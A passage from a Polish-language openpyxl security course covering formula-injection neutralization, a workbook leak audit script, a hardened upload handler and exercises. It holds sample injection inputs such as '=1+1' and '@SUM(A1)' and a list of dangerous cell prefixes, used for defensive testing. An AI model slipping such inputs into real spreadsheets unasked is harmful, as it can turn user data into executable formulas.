    """DOKUMENTUJE PULAPKE (sekcja 2.1.3, powod 1).

    Spacja na poczatku chronila - strip() ja usunal - i powstal ładunek.
    NIE "naprawiaj" tego testu. On jest ostrzezeniem.
    """
    bezpieczne_na_pozor = " =1+1"          # spacja chroni
    po_stripie = bezpieczne_na_pozor.strip()

    assert normalizuj(bezpieczne_na_pozor, "text").jako_tekst is False
    assert normalizuj(po_stripie, "text").jako_tekst is True   # ⬅ strip() POGORSZYL
```

**Co się dzieje w pamięci.** Część A nie dotyka openpyxl — 8 testów działa w mikrosekundach. Część B buduje skoroszyt w `BytesIO` i wczytuje go z powrotem (moduł 20) — po kilka milisekund na test. **Zero plików na dysku.** `_zapisz_i_wczytaj` ma w komentarzu ostrzeżenie: „model żyje po `close()`" — bo `wb2.active["A1"]` to obiekt `Cell`, który pozostaje w pamięci, ale **powinniśmy go używać tylko do odczytu i tylko przez chwilę**; przy `read_only=True` byłoby to już niedozwolone.

**Co trafi do pliku.** Nic trwałego. Ale w każdym buforze jest **kompletny plik `.xlsx`** — i w każdym z nich komórka A1 ma `t="s"`. To jest dowód, którego potrzebujesz.

**Trzy rzeczy do przemyślenia:**

1. **Test 5 jest najważniejszym testem tego pliku.** Bo chroni przed **najbardziej prawdopodobnym realnym błędem**: ktoś widzi `-` na liście `DANGEROUS_PREFIXES`, uznaje „to głupie, minus jest wszędzie", i **stosuje neutralizację globalnie**. Wtedy test 5 (i test 6 z modułu 20 o braku `None` w kolumnie kwot) padają **razem** i pokazują, że zniszczyłeś dane. To jest **obrona w głąb** w praktyce.
2. **Test 10 jest testem na „refaktoryzację psującą obronę".** Gdyby ktoś zmienił `tekst.startswith(DANGEROUS_PREFIXES)` na `tekst.startswith("=")` (bo „przecież tylko `=` działa w openpyxl"), to test 10 padnie na `+1+1`. To jest test, który **pilnuje przyszłości**, nie teraźniejszości. Zapamiętaj ten wzorzec: **testy mają bronić również przed zmianami, których jeszcze nie ma.**
3. **Test pułapki na końcu jest oznaczony jako „NIE naprawiaj".** To nawiązanie wprost do modułu 20 (sekcja 2.8). Bez docblocka ktoś by to „naprawił" — a to jest **dowód na to, dlaczego nie używamy `strip()`**.

### Przykład 3 — skrypt „audyt pliku przed wysyłką" (🔴)

Teraz narzędzie najwyższej wartości praktycznej w tym module. Ten skrypt odpowiada na jedno pytanie: **„co dokładnie wysyłam, kiedy wysyłam ten plik?"**

Zasada konstrukcyjna numer jeden: **patrzymy na ZIP, nie tylko na model.** Dlaczego, pamiętasz z sekcji 2.8 punkt (k): openpyxl nie modeluje części, których nie rozumie — więc model **z definicji** nie powie Ci o nich. A tych części może być dużo.

```python
"""Modul 21, przyklad 3: audyt skoroszytu przed udostepnieniem.

Patrzy na DWIE warstwy:
  (1) archiwum ZIP - bo openpyxl nie modeluje wszystkiego (sekcja 2.8k)
  (2) model openpyxl - bo tam jest sens dokumentu
"""

from __future__ import annotations

import re
import zipfile
from dataclasses import dataclass, field
from pathlib import Path

from openpyxl import load_workbook


@dataclass
class Zastrzezenie:
    """Jedno znalezisko audytu."""
    kategoria: str      # np. "arkusz ukryty", "link zewnetrzny"
    gdzie: str          # np. "Budget!C2" albo "\\serwer\udzial"
    szczegol: str = ""


@dataclass
class RaportAudytu:
    plik: str
    zastrzezenia: list[Zastrzezenie] = field(default_factory=list)

    def dodaj(self, kategoria, gdzie, szczegol=""):
        self.zastrzezenia.append(Zastrzezenie(kategoria, gdzie, szczegol))

    @property
    def liczba(self) -> int:
        return len(self.zastrzezenia)

    def wg_kategorii(self) -> dict[str, int]:
        wynik: dict[str, int] = {}
        for z in self.zastrzezenia:
            wynik[z.kategoria] = wynik.get(z.kategoria, 0) + 1
        return dict(sorted(wynik.items()))

    def czy_bezpieczny(self) -> bool:
        """Werdykt: czy plik nadaje sie do wyslania bez zmian?"""
        return self.liczba == 0


# =====================================================================
# WARSTWA 1: archiwum ZIP
# =====================================================================
NAZWY_CZESCI_SZCZEGOLNIE_WRAZLIWYCH = {
    "xl/media/": "pliki osadzone (obrazy, skany, zrzuty ekranu)",
    "xl/pivotCache/": "pamiec podreczna tabel przestawnych (moze zawierac dane zrodlowe!)",
    "customXml/": "wlasne czesci XML (moga zawierac dowolne dane)",
    "docProps/": "metadane dokumentu",
    "xl/externalLinks/": "linki zewnętrzne do innych plikow",
    "xl/drawings/": "rysunki i pola tekstowe",
    "xl/vbaProject.bin": "makra VBA",
}


def _sprawdz_archiwum(sciezka: Path, raport: RaportAudytu) -> None:
    """Inwentarz czesci + linki zewnętrzne czytane WPROST z ZIP-a."""
    with zipfile.ZipFile(sciezka) as zf:
        nazwy = zf.namelist()

        # 1) czesci szczegolnie wrazliwe
        for prefiks, opis in NAZWY_CZESCI_SZCZEGOLNIE_WRAZLIWYCH.items():
            znalezione = [n for n in nazwy if n.startswith(prefiks)]
            if znalezione:
                raport.dodaj("czesc archiwum", prefiks, f"{len(znalezione)}x - {opis}")

        # 2) LINLI ZEWNETRZNE: czytamy relacje z ZIP-a, nie z wb._external_links,
        #    bo ta atrybut jest PRYWATNY i moze sie zmienic (sekcja 2.8f).
        wzorzec = re.compile(r"xl/externalLinks/_rels/externalLink(\d+)\.xml\.rels$")
        for nazwa in nazwy:
            m = wzorzec.match(nazwa)
            if not m:
                continue
            tresc = zf.read(nazwa).decode("utf-8", errors="replace")
            for target_esc in re.findall(r'Target="([^"]+)"', tresc):
                target = target_esc.replace("%20", " ").replace("file:///", "")
                ryzyko = ""
                if target.startswith("\\\\") or target.startswith("//"):
                    ryzyko = "SCIEZKA UNC - ujawnia nazwy serwerow i udzialow!"
                elif re.match(r"^[A-Za-z]:\\", target):
                    ryzyko = "sciezka lokalna - ujawnia nazwe uzytkownika/systemu"
                raport.dodaj("link zewnętrzny", target, ryzyko)


# =====================================================================
# WARSTWA 2: model openpyxl
# =====================================================================
def _sprawdz_model(sciezka: Path, raport: RaportAudytu) -> None:
    wb = load_workbook(sciezka)
    try:
        # --- arkusze: widocznosc ------------------------------------------
        for ws in wb.worksheets:
            if ws.sheet_state != "visible":
                raport.dodaj(
                    "arkusz ukryty",
                    ws.title,
                    f"stan={ws.sheet_state}, wierszy={ws.max_row}",
                )

        for ws in wb.worksheets:
            # --- ukryte kolumny/wiersze Z DANYMI ---------------------------
            for litera, dim in ws.column_dimensions.items():
                if dim.hidden:
                    ma_dane = any(
                        c.value is not None for c in ws[litera]
                    )
                    if ma_dane:
                        raport.dodaj("ukryta kolumna", f"{ws.title}!{litera}", "zawiera dane")

            for numer, dim in ws.row_dimensions.items():
                if dim.hidden:
                    ma_dane = any(
                        c.value is not None for c in ws[numer]
                    )
                    if ma_dane:
                        raport.dodaj("ukryty wiersz", f"{ws.title}!{numer}", "zawiera dane")

            # --- komorki: jedna petla, kilka kontroli ----------------------
            for wiersz in ws.iter_rows():
                for c in wiersz:
                    gdzie = f"{ws.title}!{c.coordinate}"

                    if c.comment is not None:
                        raport.dodaj("komentarz", gdzie,
                                     f"autor={c.comment.author!r}")

                    if c.number_format == ";;;" and c.value is not None:
                        raport.dodaj("wartosc ukryta formatem", gdzie, "kod formatu ';;;'")

                    if c.data_type == "f" and isinstance(c.value, str):
                        if "[" in c.value:
                            raport.dodaj("formula do linku zewn.", gdzie, c.value[:60])
                        elif "!" in c.value:
                            raport.dodaj("formula miedzyarkuszowa", gdzie, c.value[:60])

        # --- definiowane nazwy: ukryte i zewnętrzne ------------------------
        for nazwa, definicja in wb.defined_names.items():
            uwagi = []
            if definicja.hidden:
                uwagi.append("UKRYTA")
            if definicja.is_external:
                uwagi.append("ZEWNETRZNA")
            raport.dodaj("definiowana nazwa", nazwa,
                         f"{definicja.attr_text} {' '.join(uwagi)}".strip())

        # --- wlasciwosci dokumentu ----------------------------------------
        for pole in ("creator", "lastModifiedBy", "title", "subject",
                     "keywords", "description", "category"):
            wartosc = getattr(wb.properties, pole, None)
            if wartosc:
                raport.dodaj("wlasciwosc dokumentu", pole, str(wartosc)[:80])

        for prop in wb.custom_doc_props:
            raport.dodaj("wlasna wlasciwosc", prop.name, str(prop.value)[:80])

    finally:
        wb.close()


# =====================================================================
# INTERFEJS
# =====================================================================
def audyt(sciezka) -> RaportAudytu:
    sciezka = Path(sciezka)
    raport = RaportAudytu(plik=sciezka.name)
    _sprawdz_archiwum(sciezka, raport)
    _sprawdz_model(sciezka, raport)
    return raport


if __name__ == "__main__":
    import sys

    raport = audyt(sys.argv[1])

    print(f"\n=== AUDYT: {raport.plik} ===")
    if raport.czy_bezpieczny():
        print("Brak zastrzezen. Plik nadaje sie do wyslania.")
    else:
        print(f"ZNALAZIONO {raport.liczba} ZASTRZEZEN:\n")
        for z in raport.zastrzezenia:
            szczegol = f"  -> {z.szczegol}" if z.szczegol else ""
            print(f"  [{z.kategoria}] {z.gdzie}{szczegol}")
        print("\n--- podsumowanie wg kategorii ---")
        for kat, ile in raport.wg_kategorii().items():
            print(f"  {kat:32} {ile}")
        print("\nWERDYKT: nie wysylaj tego pliku bez zmian.")
        print("Rozwaz: wygeneruj nowy plik z wartosci (data_only=True,")
        print("keep_links=False) zamiast wysylac ten.")
```

**Co się dzieje w pamięci.** Dwa niezależne kroki. **Krok ZIP** otwiera archiwum tylko do odczytu nagłówków i kilku małych części XML — tanie. **Krok model** wczytuje pełny skoroszyt (`load_workbook`, tryb normalny!) — bo potrzebujemy `comment`, `number_format` i `data_type`, których `read_only` nam nie da. Pamięć to ~50× rozpakowany rozmiar arkuszy (moduł 19), więc na wielkich plikach audyt **boli**. Rozwiązanie: audytuj na pliku wyjściowym (mały), a nie na wejściowym 500 000 wierszy — albo wczytaj `read_only=True` i zrezygnuj z części kontroli, świadomie.

**Co trafi do pliku.** Nic — audyt jest **tylko do odczytu**. To ważna cecha: narzędzie, które ma sprawdzać plik, **nie może go zmieniać**. (Wpisz to sobie do checklisy: audyt bez prawa zapisu — na poziomie uprawnień systemowych, nie tylko „w kodzie nie ma `save`".)

**Przykładowe wyjście:**

```text
=== AUDYT: q3_results.xlsx ===
ZNALAZIONO 11 ZASTRZEZEN:

  [czesc archiwum] docProps/  -> 3x - metadane dokumentu
  [czesc archiwum] xl/externalLinks/  -> 2x - linki zewnętrzne do innych plikow
  [czesc archiwum] xl/media/  -> 1x - pliki osadzone (obrazy, skany, zrzuty ekranu)
  [arkusz ukryty] Salaries  -> stan=veryHidden, wierszy=480
  [ukryta kolumna] Summary!D  -> zawiera dane
  [wartosc ukryta formatem] Summary!B7  -> kod formatu ';;;'
  [komentarz] Summary!C3  -> autor='Jan Kowalski'
  [link zewnętrzny] \\FILESERVER01\Finanse$\2026\Budzet_vertrauliczny.xlsx  -> SCIEZKA UNC
  [definiowana nazwa] Marza_Zakupu  -> Salaries!$B$2:$B$480 UKRYTA ZEWNETRZNA
  [wlasciwosc dokumentu] creator  -> jkowalski
  [wlasciwosc dokumentu] lastModifiedBy  -> Anna Nowak (Dzial Kontrolingu)

--- podsumowanie wg kategorii ---
  arkusz ukryty            1
  czesc archiwum           3
  definiowana nazwa        1
  komentarz                1
  link zewnętrzny          1
  ukryta kolumna           1
  wartosc ukryta formatem  1
  wlasciwosc dokumentu     2 (wypisane osobno)

WERDYKT: nie wysylaj tego pliku bez zmian.
```

**Trzy rzeczy do przemyślenia:**

1. **Zobacz, ile informacji wycieka, mimo że raport „wygląda normalnie".** Jeden plik, jedenaście zastrzeżeń, w tym **ścieżka UNC do serwera plików z ukrytym udziałem** i **nazwisko pracownika działu kontrolingu**. Czy którykolwiek z tych faktów byłby widoczny w Excelu dla odbiorcy? Nie. Arkusza `Salaries` (`veryHidden`) nie zobaczy w żadnym menu. `;;;` nie pokaże wartości. Ale **wszystko to jest w pliku** i wychodzi na jednej komendzie.
2. **Zauważ, że część kontroli jest „za darmo" z modułu 02.** `zl/externalLinks/` czytamy **z ZIP-a**, nie z `wb._external_links` — i to nie jest nadmierna ostrożność. Atrybut `_external_links` **jest prywatny** (podkreślenie na początku!), więc może zniknąć albo zmienić nazwę w dowolnej wersji openpyxl. Format ZIP-a **jest standardem** — więc zostanie taki sam. To ta sama decyzja, co w `podsumowanie_skoroszytu` z modułu 20: **czytaj standard, nie implementację.**
3. **Werdykt prowadzi do decyzji, nie do paniki.** Ostatnie linie wyjścia mówią **co zrobić**: nie „ten plik jest niebezpieczny", ale „**rozważ wygenerowanie nowego pliku z wartości**". Narzędzie, które tylko straszy, jest bezużyteczne. Narzędzie, które wskazuje **drogę wyjścia z sytuacji**, jest używane.

### Przykład 4 — bezpieczny handler uploadu (🔴)

Ostatni przykład: pełny przepływ dla pliku, który przyszedł **od obcego**. To jest przepis wdrożeniowy dla sekcji 2.11.

```python
"""Modul 21, przyklad 4: bezpieczne przetwarzanie pliku od uzytkownika."""

from __future__ import annotations

import io
import os
import tempfile
import zipfile
from pathlib import Path

import openpyxl
from openpyxl import load_workbook
from openpyxl.utils.exceptions import InvalidFileException

# --- FAIL-FAST: sprawdzamy zabezpieczenia PRZY STARCIE, nie w logu --------
if not openpyxl.DEFUSEDXML:
    raise RuntimeError(
        "defusedxml NIE jest aktywny. Zainstaluj: pip install defusedxml. "
        "Sprawdz tez, czy OPENPYXL_DEFUSEDXML nie jest ustawione na inna "
        "wartosc niz 'True' (np. '1' albo 'true' WYLACZAJA ochrone!)."
    )

DOZWOLONE_ROZSZERZENIA = {".xlsx", ".xlsm"}

LIMIT_BAJTOW = 20 * 1024 * 1024          # 20 MB plik wejsciowy
LIMIT_ROZPAKOWANE = 200 * 1024 * 1024    # 200 MB po rozpakowaniu
LIMIT_WSPOLCZYNNIK = 50.0
LIMIT_CZESCI = 5000


class OdrzuconeWejscie(Exception):
    """Plik wejsciowy nie przeszedl walidacji. Komunikat JEST dla uzytkownika."""


def _waliduj_rozszerzenie(nazwa: str) -> None:
    """SAMI sprawdzamy rozszerzenie - openpyxl tego NIE robi dla buforow!"""
    if Path(nazwa).suffix.lower() not in DOZWOLONE_ROZSZERZENIA:
        raise OdrzuconeWejscie(
            f"Niedozwolony format. Akceptujemy: {sorted(DOZWOLONE_ROZSZERZENIA)}"
        )


def _waliduj_tresc(bajty: bytes) -> None:
    """Sprawdza TRESC: rozmiar, ZIP, limity rozpakowania."""
    if len(bajty) > LIMIT_BAJTOW:
        raise OdrzuconeWejscie("Plik jest za duzy.")

    bufor_sprawdzany = io.BytesIO(bajty)
    if not zipfile.is_zipfile(bufor_sprawdzany):
        raise OdrzuconeWejscie("Plik nie jest poprawnym archiwum XLSX.")

    with zipfile.ZipFile(bufor_sprawdzany) as zf:
        infos = zf.infolist()

        if len(infos) > LIMIT_CZESCI:
            raise OdrzuconeWejscie(f"Za duzo czesci w archiwum ({len(infos)}).")

        rozpakowane = sum(i.file_size for i in infos)
        spakowane = max(sum(i.compress_size for i in infos), 1)

        if rozpakowane > LIMIT_ROZPAKOWANE:
            raise OdrzuconeWejscie("Rozpakowany rozmiar przekracza limit.")
        if rozpakowane / spakowane > LIMIT_WSPOLCZYNNIK:
            raise OdrzuconeWejscie("Podejrzenie zip bomb (wysoki wspolczynnik).")

        # Musi to byc OOXML, a nie dowolny ZIP udajacy XLSX.
        if "[Content_Types].xml" not in zf.namelist():
            raise OdrzuconeWejscie("Brak [Content_Types].xml - to nie jest OOXML.")


def wczytaj_dane_uzytkownika(nazwa: str, bajty: bytes) -> list[list]:
    """Bezpieczne wejscie: walidacja -> odczyt -> WARTOSCI (bez formul!)."""
    _waliduj_rozszerzenie(nazwa)
    _waliduj_tresc(bajty)

    try:
        # read_only=True: mniejsza pamiec, brak budowy pelnego modelu
        wb = load_workbook(io.BytesIO(bajty), read_only=True,
                           data_only=True,     # ⬅ formuly -> wartosci (modul 06!)
                           keep_links=False)   # ⬅ linki zewnętrzne precz
    except (InvalidFileException, zipfile.BadZipFile, KeyError) as exc:
        # NIE przekazujemy surowego wyjatku uzytkownikowi (moglby zawierac
        # sciezki i strukture wewnetrzna). Logujemy u siebie, zwracamy ogolnie.
        raise OdrzuconeWejscie("Nie udalo sie odczytac pliku.") from exc

    wiersze: list[list] = []
    try:
        ws = wb.worksheets[0]
        for wiersz in ws.iter_rows(values_only=True):   # values_only = tylko dane
            if all(v is None for v in wiersz):
                continue
            wiersze.append(list(wiersz))
    finally:
        wb.close()      # OBOWIAZKOWE w read_only (modul 19)

    return wiersze


def zbuduj_raport_od_zera(dane: list[list], cel: Path) -> Path:
    """Buduje NOWY skoroszyt z WARTOSCI. To jest wariant zalecany.

    Kazda wartosc przechodzi przez normalizacje i bezpieczny zapis,
    wiec dane od uzytkownika NIGDY nie staja sie formulami.
    """
    from normalizacja import normalizuj          # z 3.1.1
    from zapis import zapisz_komorke             # z 3.1.2

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Dane"

    for r, wiersz in enumerate(dane, start=1):
        for c, wartosc in enumerate(wiersz, start=1):
            # tryb 'text' dla wszystkiego, co nie jest liczba:
            tryb = "number" if isinstance(wartosc, (int, float)) else "text"
            zapisz_komorke(ws, r, c, normalizuj(wartosc, tryb))

    wb.properties.creator = "Automat raportowy"

    # --- ZAPIS ATOMOWY (modul 18) ---
    fd, tmp = tempfile.mkstemp(suffix=".xlsx", dir=cel.parent)   # NIE mktemp()!
    os.close(fd)
    try:
        wb.save(tmp)
        os.replace(tmp, cel)          # atomowa podmiana na tym samym wolumenie
    except BaseException:
        Path(tmp).unlink(missing_ok=True)
        raise
    finally:
        wb.close()

    return cel
```

**Co się dzieje w pamięci.** Trzy chronione punkty, w tej kolejności: **(1)** `_waliduj_tresc` czyta **tylko nagłówki ZIP** — tania operacja, która jednak zatrzymuje bombę, zanim cokolwiek się rozpakuje. **(2)** `load_workbook(..., read_only=True, data_only=True, keep_links=False)` — trzy flagi, każda z innego powodu: `read_only` oszczędza pamięć (moduł 19), `data_only` **zamienia formuły na wartości**, więc w kolejnym kroku nie ma już czego wstrzykiwać (moduł 06), `keep_links` **w ogóle nie wczytuje** części `externalLink` (sekcja 2.10). **(3)** `iter_rows(values_only=True)` → dostajesz **krotki wartości**, nie obiekty `Cell`, więc nie ma nawet sposobu, żeby „przenieść" `data_type` z pliku wejściowego. To jest jedyne w swoim rodzaju zabezpieczenie: **struktura API uniemożliwia błąd.**

**Co trafi do pliku.** Nowy skoroszyt: dane jako **wartości/tekst** (nigdy formuły), czyste metadane, brak `xl/externalLinks/`, brak pamięci podręcznych przestawnych, brak `veryHidden`, brak komentarzy. Zapis **atomowy**: plik albo powstaje w całości, albo nie powstaje wcale — nie ma stanu „raport istnieje, ale jest obcięty".

**Trzy rzeczy do przemyślenia:**

1. **Trzy flagi `load_workbook` to nie ostrożność, to projekt.** `data_only=True` + `keep_links=False` w jednej linii realizują zasadę z sekcji 2.9.1: **zamiast czyścić cudzy plik, odczytaj z niego tylko wartości.** To jest różnica między „naprawianiem kontenera" a „wyjęciem ładunku i zapakowaniem go od nowa w swoim". Druga metoda jest odporna na to, że **nie znasz wszystkich przegród** — o czym przekonałeś się w sekcji 2.8(k).
2. **Sekwencja `mkstemp` → `save` → `os.replace` z `except BaseException`.** Zwróć uwagę na `BaseException`, a nie `Exception` — bo plik tymczasowy trzeba posprzątać **także** przy `KeyboardInterrupt` i `SystemExit`. Zapamiętaj ten wzorzec: **sprzątanie nie może być uzależnione od tego, czy błąd jest „ładny".** I jeszcze: `tempfile.mktemp()` **nie występuje w tym kodzie ani razu** — celowo.
3. **Fail-fast na `DEFUSEDXML` jest na samej górze modułu.** Nie w funkcji, nie w handlerze — **w kodzie, który się wykonuje przy imporcie**. Dlaczego? Bo lepiej, żeby proces **w ogóle nie wstał**, niż żeby działał w przekonaniu, że jest chroniony. To jest ta sama filozofia, co `--cov-fail-under` i krok `assert LXML` w CI z modułu 20: **zabezpieczenie musi być zweryfikowane, a nie założone.**

## 4. Anatomia API

| Klasa / funkcja | Co robi | Parametry | Uwagi |
|---|---|---|---|
| `cell.value = "=..."` | przypisanie wartości | — | **Uruchamia heurystykę formuły!** `startswith("=")` i `len > 1` → `data_type='f'` |
| `cell.data_type` | typ komórki (`s`/`f`/`n`/`b`/`e`/`inlineStr`/`str`) | — | **Zapisywalny** — to Twoje narzędzie neutralizacji |
| `cell.data_type = "s"` | wymuszenie tekstu | — | **Po** przypisaniu wartości, nigdy przed (2.2, szczegół A) |
| `Cell.VALID_TYPES` | dozwolone wartości `data_type` | — | spoza listy → `ValueError: Invalid data type` |
| `cell.set_explicit_value(v, data_type="s")` | wartość + typ naraz | `value`, `data_type` | domyślny `data_type` to **`"s"`** — pułapka! sprawdź swoją wersję |
| `cell.check_string(value)` | obcina do 32 767 znaków, waliduje znaki | — | podnosi `IllegalCharacterError` dla znaków niedozwolonych w XML |
| `openpyxl.utils.escape.escape(v)` | znaki `< 31` → `_xHHHH_` | — | **NIE chroni przed formułami** (2.3)! |
| `openpyxl.utils.escape.unescape(v)` | `_xHHHH_` → znak | — | odwrotność; też nie o formułach |
| `openpyxl.DEFUSEDXML` | czy `defusedxml` jest **aktywny** | — | bool; sprawdzaj przy starcie (fail-fast) |
| `openpyxl.LXML` | czy `lxml` jest **aktywny** | — | bool; wpływa na wydajność i ścieżkę parsowania |
| `OPENPYXL_DEFUSEDXML` (env) | wyłączenie `defusedxml` | `"True"`/inne | **każda wartość != `"True"` WYŁĄCZA** (także `"1"`, `"true"`) |
| `load_workbook(..., keep_links=True)` | zachowanie linków zewnętrznych | `bool`, domyślnie `True` | `False` → nie wczytuje części `externalLink`; oszczędza pamięć i czas |
| `wb._external_links` | lista linków zewnętrznych | — | ⚠️ **API PRYWATNE** — do audytu czytaj `xl/externalLinks/*` z ZIP-a |
| `link.file_link.Target` | cel linku (ścieżka/URL) | — | bywa `\\serwer\udzial$` — rekonesans (2.8f) |
| `definicja.is_external` | czy nazwa wskazuje inny plik | — | regex `^\[\d+\]` — gotowa metoda `DefinedName` |
| `definicja.hidden` | czy nazwa jest ukryta | — | ukryta nazwa = ukryte znaczenie w menedżerze nazw |
| `definicja.attr_text` | treść nazwy (adres/formuła) | — | `value` to alias `attr_text` |
| `ws.sheet_state` | widoczność arkusza | `"visible"`/`"hidden"`/`"veryHidden"` | `veryHidden` **nie ma go w menu Odkryj Excela** |
| `ws.protection.sheet` | ochrona arkusza | `bool` | + `wb.security.lockStructure` |
| `ws.protection.password = "..."` | hasło arkusza | — | „Legacy Hash" — **nie szyfrowanie** |
| `wb.security.workbookPassword` | hasło ochrony struktury | — | hashuje automatycznie |
| `wb.security.lockStructure` | blokada struktury skoroszytu | `bool` | bez hasła **nie działa** |
| `wb.security.revisionsPassword` | hasło śledzenia zmian | — | |
| `wb.security.set_workbook_password(v, already_hashed=True)` | ustawienie **gotowego** hasha | — | gdy sam zarządzasz hash'em |
| `cell.number_format == ";;;"` | **ukrycie wartości formatem** | — | komórka ma wartość, ale pokazuje pustkę (2.8c) |
| `cell.comment` / `.author` | komentarz i autor | — | autor ujawnia nazwisko/dział |
| `ws.column_dimensions[L].hidden` | ukryta kolumna | `bool` | sprawdzaj, czy **ma dane** (unikaj fałszywych alarmów) |
| `ws.row_dimensions[i].hidden` | ukryty wiersz | `bool` | jak wyżej |
| `wb.properties.creator` / `.lastModifiedBy` / `.title` / `.subject` / `.keywords` / `.description` | metadane | — | wyciek nazwisk, firm, projektów |
| `wb.custom_doc_props` | własne właściwości dokumentu | — | dowolne pary klucz/wartość (nowość 3.1) |
| `zipfile.is_zipfile(f)` | czy to archiwum ZIP | — | tanio; pierwszy krok walidacji treści |
| `ZipFile.namelist()` | lista nazw części | — | **standard OOXML** — stabilniejsze niż prywatne atrybuty |
| `ZipFile.infolist()` + `.file_size`/`.compress_size` | rozmiary **z nagłówka** | — | podstawa detekcji zip bomb (2.6.1) |
| `zipfile.BadZipFile` | wyjątek | — | niepoprawne/obcięte archiwum |
| `openpyxl.utils.exceptions.InvalidFileException` | złe rozszerzenie / nie-OOXML | — | **tylko dla ścieżek**, nie dla buforów (2.6.3) |
| `openpyxl.utils.exceptions.IllegalCharacterError` | znak niedozwolony w XML | — | inna klasa problemu niż formuły |
| `tempfile.mkstemp(suffix, dir)` | atomowe utworzenie pliku tymczasowego | → `(fd, path)` | ✅ zalecane |
| `tempfile.mktemp()` | zwraca **tylko nazwę** | — | ❌ **NIEBEZPIECZNE** (wyścig TOCTOU) |
| `subprocess.run(..., timeout=N)` | limit czasu | — | timeout w kliencie HTTP **nie zatrzyma** procesu |

## 5. Ćwiczenia

### 🟢 Rozgrzewka

**Zadanie 1 — zademonstruj na własnym pliku, że `=` w danych staje się formułą.**

Napisz `examples/21_pulapka_formuly.py`, który:

1. Tworzy `Workbook` i w `A1` wpisuje `"=1+1"`, w `A2` — `"zwykły tekst"`, w `A3` — `"+1+1"`, w `A4` — `"@SUM(A1)"`.
2. **Przed** zapisem wypisuje dla każdej komórki: adres, `repr(.value)` i `repr(.data_type)`.
3. Zapisuje skoroszyt do `output/21_pulapka.xlsx`.
4. Wczytuje plik z powrotem (pamiętaj o `close()`) i wypisuje to samo.
5. Rozpakowuje plik jako ZIP i **wypisuje zawartość `xl/worksheets/sheet1.xml`** — żeby zobaczyć na własne oczy, gdzie jest `<f>`, a gdzie `<v>`.
6. Tworzy drugi skoroszyt, w którym po każdym przypisaniu **wymusza** `data_type = "s"`, i zapisuje `output/21_pulapka_naprawiona.xlsx`.
7. Na koniec otwiera **oba** pliki w Excelu (albo LibreOffice) i **zapisuje w `output/21_cw1_obserwacje.md`**, co zobaczyłeś: co pokazuje `A1` w pierwszym pliku, co w drugim, czy jest ostrzeżenie, czy kolumna wyrównana do lewej.

W pliku `output/21_cw1_wnioski.md` odpowiedz:

1. **Czy `A3` (`"+1+1"`) dostało `data_type = 'f'`?** Wypisz wynik i wyjaśnij, dlaczego tak/nie — odwołując się do tego, że openpyxl używa **tylko** `startswith("=")`.
2. **Co pokazuje pierwszy plik w `A1` w Excelu?** A co pokazuje goła zawartość komórki, gdy najedziesz i spojrzysz w pasek formuły?
3. **Dlaczego w drugim pliku nie ma ani jednego `<f>` w XML-u?** Odpowiedz odwołując się do `data_type`.
4. **Czy wartość w `A1` drugiego pliku to `"=1+1"` czy coś innego?** Sprawdź `repr` i **wyjaśnij, dlaczego to jest ważne dla zaufania użytkownika do raportu**.
5. **Który znak wyzwalający openpyxl wykrywa samodzielnie, a których nie?** Zestaw z listą OWASP z sekcji 2.1.3 w tabelce trzech kolumn: znak / działa w Excelu / wykrywa openpyxl.

### 🟡 Warsztat

**Zadanie 2 — napisz `sanitize_cell_value()` z testami dla 10 przypadków.**

To jest rozbudowa Przykładu 2. Napisz **trzy pliki**:

**`src/normalizacja.py`** — dokładnie jak w 3.1.1. Wymagania:

1. `Komorka` jako `@dataclass(frozen=True)` z polami `wartosc` i `jako_tekst`.
2. `DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")`.
3. `normalizuj(wartosc, tryb)` obsługujący tryby: `"text"`, `"number"`, `"integer"`, `"bool"`.
4. **Bez `strip()`** — z komentarzem wyjaśniającym dlaczego (to jest część oceny zadania!).
5. `bool` obsłużony **przed** liczbami (bo `bool` jest podtypem `int`).
6. Brak importu `openpyxl` w tym pliku — sprawdź to linterem.

**`src/zapis.py`** — jak w 3.1.2. Wymagania:

1. `zapisz_komorke(ws, row, column, komorka)` z **komentarzem o obowiązkowej kolejności**.
2. `zapisz_wiersz(ws, row, wartosci, tryby)`.
3. **Dokładnie jeden** import `openpyxl` w tym pliku.

**`tests/test_21_sanitize.py`** — **minimum 15 testów** (10 wymaganych + przynajmniej 5 własnych). Musisz pokryć:

| # | Przypadek | Oczekiwanie |
|---|---|---|
| 1 | `"=1+1"` w trybie `text` | `jako_tekst is True`, wartość niezmieniona |
| 2 | każdy z 6 znaków wyzwalających (`parametrize`) | `jako_tekst is True` |
| 3 | `"Kowalski sp. z o.o."` | `jako_tekst is False` |
| 4 | `"1 200,50"` w trybie `number` | `1200.5`, `jako_tekst is False` |
| 5 | `"-1200,50"` w trybie `number` | `-1200.5`, `jako_tekst is False` (to test kontekstu!) |
| 6 | `"=1+1"` w trybie `number` | `None`, `jako_tekst is False` (raport ma powstać!) |
| 7 | `None` i `""` w trybie `text` | odpowiednio `None` i `""`, `jako_tekst is False` |
| 8 | `True` w trybie `number` | `True` (nie `1.0`!) |
| 9 | round-trip w `BytesIO` dla `"=1+1"` | `data_type == "s"`, `value == "=1+1"` |
| 10 | `"+1+1"`, `"-1+1"`, `"@SUM(A1)"`, `"\t=1+1"`, `"\r=1+1"` | wszystkie `data_type == "s"` |
| 11 | `"1.234,56"` w `number` (oba separatory) | `1234.56` |
| 12 | `"abc"` w `number` | `None` |
| 13 | `"TAK"` w `bool` | `True` |
| 14 | `"__proto__"` w `text` | `jako_tekst is False` (bo nie prefiks) + `data_type == "s"` po zapisie |
| 15 | test pułapki: `strip()` tworzy formułę | z docblockiem `"""DOKUMENTUJE PULAPKE..."""` |

W pliku `output/21_cw2_wnioski.md` odpowiedz:

1. **Dlaczego test 5 (minus w liczbie ujemnej) jest ważniejszy niż test 1?** Odpowiedz w trzech zdaniach, używając słowa „kontekst".
2. **Co by się stało, gdybyś usunął `-` z `DANGEROUS_PREFIXES`?** Które testy padną? A co by się stało, gdybyś `-` **dodał do neutralizacji globalnie**? Które testy padną **teraz**? Dlaczego **żadna z tych dwóch decyzji nie jest dobra**?
3. **Ile trwa cały zestaw testów?** Uruchom `pytest --durations=5`. Ile testów nie dotyka openpyxl? Wyjaśnij, dlaczego to jest ważne (moduł 20, sekcja 2.10).
